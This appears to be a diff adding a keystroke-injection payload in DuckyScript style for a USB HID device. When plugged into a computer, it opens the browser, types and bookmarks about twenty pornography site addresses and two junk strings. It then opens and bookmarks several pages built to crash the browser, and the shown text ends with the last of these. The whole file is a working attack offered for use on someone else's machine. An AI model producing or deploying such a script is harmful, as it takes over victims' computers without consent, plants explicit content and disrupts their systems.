@@ -1,0 +1,396 @@
+DELAY 100
+
+GUI b
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING pornhub.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING xvideos.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING xhamster.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING xnxx.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING eporner.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING HQporner.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING beeg.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING yourporn.sexy
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING spankbang.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING porntrex.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING xmoviesforyou.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING porngo.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING youjizz.com
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://neporn.com/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://sxyprn.com/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://porntrex.com/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://pornxp.com/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://whoreshub.com/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://pxxbay.com/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING sd;lkfh
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING ;alskdjf 
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://jonnybanana.github.io/safari-ie-reaper.github.io/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING http://www.newdream.net/crash/js2.html
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://crash-ur-pc.vercel.app/
+
+DELAY 150
+
+ENTER 
+
+DELAY 1000
+
+CTRL D
+
+DELAY 100
+
+CTRL l
+
+DELAY 100
+
+STRING https://thecomputercrasher.github.io/
+
